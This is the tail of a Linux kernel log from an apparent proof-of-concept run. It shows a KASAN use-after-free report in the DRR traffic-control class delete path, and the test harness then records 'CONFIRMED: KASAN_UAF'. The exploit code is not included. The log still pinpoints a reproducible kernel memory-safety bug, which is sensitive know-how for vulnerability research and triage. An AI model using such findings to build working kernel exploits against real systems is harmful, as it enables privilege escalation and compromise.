[    1.111071]  tc_ctl_tclass+0x3c5/0xf20
[    1.111222]  rtnetlink_rcv_msg+0x359/0x9d0
[    1.111385]  netlink_rcv_skb+0x11d/0x350
[    1.111540]  netlink_unicast+0x597/0x810
[    1.111697]  netlink_sendmsg+0x7b3/0xc60
[    1.111853]  sock_sendmsg+0xdf/0x110
[    1.111997]  ____sys_sendmsg+0x5c6/0x7d0
[    1.112154]  ___sys_sendmsg+0x100/0x180
[    1.112307]  __sys_sendmsg+0xe2/0x190
[    1.112455]  do_syscall_64+0x37/0x90
[    1.112598]  entry_SYSCALL_64_after_hwframe+0x63/0xcd
[    1.112797] 
[    1.112863] Freed by task 84:
[    1.112983]  kasan_save_stack+0x2f/0x60
[    1.113139]  kasan_set_track+0x21/0x30
[    1.113289]  kasan_save_free_info+0x2a/0x50
[    1.113454]  __kasan_slab_free+0x106/0x180
[    1.113617]  __kmem_cache_free+0x76/0x180
[    1.113777]  drr_delete_class+0x2b4/0x420
[    1.113937]  tc_ctl_tclass+0x996/0xf20
[    1.114089]  rtnetlink_rcv_msg+0x359/0x9d0
[    1.114254]  netlink_rcv_skb+0x11d/0x350
[    1.114410]  netlink_unicast+0x597/0x810
[    1.114567]  netlink_sendmsg+0x7b3/0xc60
[    1.114722]  sock_sendmsg+0xdf/0x110
[    1.114867]  ____sys_sendmsg+0x5c6/0x7d0
[    1.115024]  ___sys_sendmsg+0x100/0x180
[    1.115178]  __sys_sendmsg+0xe2/0x190
[    1.115324]  do_syscall_64+0x37/0x90
[    1.115468]  entry_SYSCALL_64_after_hwframe+0x63/0xcd
[    1.115666] 
[    1.115731] The buggy address belongs to the object at ffff888009898000
[    1.115731]  which belongs to the cache kmalloc-128 of size 128
[    1.116209] The buggy address is located 96 bytes inside of
[    1.116209]  128-byte region [ffff888009898000, ffff888009898080)
[    1.116654] 
[    1.116719] The buggy address belongs to the physical page:
[    1.116939] page:0000000012370e2b refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x9898
[    1.117294] flags: 0x100000000000200(slab|node=0|zone=1)
[    1.117504] raw: 0100000000000200 0000000000000000 dead000000000122 ffff8880060418c0
[    1.117808] raw: 0000000000000000 0000000080100010 00000001ffffffff 0000000000000000
[    1.118122] page dumped because: kasan: bad access detected
[    1.118343] 
[    1.118411] Memory state around the buggy address:
[    1.118607]  ffff888009897f00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    1.118898]  ffff888009897f80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    1.119183] >ffff888009898000: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    1.119473]                                                        ^
[    1.119728]  ffff888009898080: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    1.120014]  ffff888009898100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fc fc
[    1.120295] ==================================================================
[    1.120580] Disabling lock debugging due to kernel taint
[    1.679166] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3
poc: done — KASAN should have [    2.121831] poc (84) used greatest stack depth: 25968 bytes left
fired by now
---- poc end rc=0 ----
secb: poc exited without crashing the kernel
[    3.385497] ACPI: PM: Preparing to enter system sleep state S5
[    3.385811] reboot: Power down
CONFIRMED: KASAN_UAF
